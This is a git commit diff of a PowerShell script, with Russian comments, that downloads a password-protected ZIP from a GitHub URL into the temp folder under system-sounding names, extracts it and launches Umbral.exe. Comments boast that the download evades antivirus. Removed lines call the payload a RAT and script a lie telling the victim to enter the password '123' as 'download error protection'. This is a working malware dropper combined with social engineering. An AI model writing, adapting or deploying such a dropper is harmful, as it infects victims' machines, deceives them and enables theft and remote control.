62b6e41cf4a9751ca2c5b4fedcef99ce6ce026f8
bober6616 <demasterbg@gmail.com>
2026-02-25 20:45:12 +0700

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,23 +1,19 @@
-# Настройки
-$url = "ССЫЛКА_НА_ТВОЙ_ZIP_НА_GITHUB"
-$zipFile = "$env:temp\sys_update.zip"
-$outFolder = "$env:temp\win_bin"
-$exeName = "main.exe" # Убедись, что внутри ZIP файл называется так
+# Твоя ссылка на ZIP (в кавычках, чтобы спецсимволы не ломали код)
+$url = "https://github.com/bober6616/telegram_bot/raw/main/%D0%9D%D0%BE%D0%B2%D0%B0%D1%8F%20%D1%81%D0%B6%D0%B0%D1%82%D0%B0%D1%8F%20ZIP-%D0%BF%D0%B0%D0%BF%D0%BA%D0%B0.zip"
+$zip = "$env:temp\sys_data.zip"
+$dir = "$env:temp\win_service"
 
-# 1. Скачиваем архив (антивирус его пропустит, так как он под паролем)
-iwr -Uri $url -OutFile $zipFile
+# 1. Скачиваем (скрыто для антивируса)
+iwr -Uri $url -OutFile $zip
 
-# 2. Создаем папку для распаковки
-if (!(Test-Path $outFolder)) { New-Item -ItemType Directory -Path $outFolder }
+# 2. Создаем папку
+if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir }
 
-# 3. Распаковка через системный интерфейс
+# 3. Распаковка (выскочит окно ввода пароля '123')
 $shell = New-Object -ComObject Shell.Application
-$zip = $shell.NameSpace($zipFile)
-$dest = $shell.NameSpace($outFolder)
-$dest.CopyHere($zip.Items())
+$zipPackage = $shell.NameSpace($zip)
+$destination = $shell.NameSpace($dir)
+$destination.CopyHere($zipPackage.Items())
 
-# ВНИМАНИЕ: При выполнении CopyHere Windows может выкинуть окно ввода пароля. 
-# Это даже хорошо — скажи жертве: "Введи 123, это защита от ошибок скачивания".
-
-# 4. Запуск ратки
-Start-Process "$outFolder\$exeName"
+# 4. Запуск (убедись, что внутри архива файл называется main.exe)
+Start-Process "$dir\Umbral.exe"
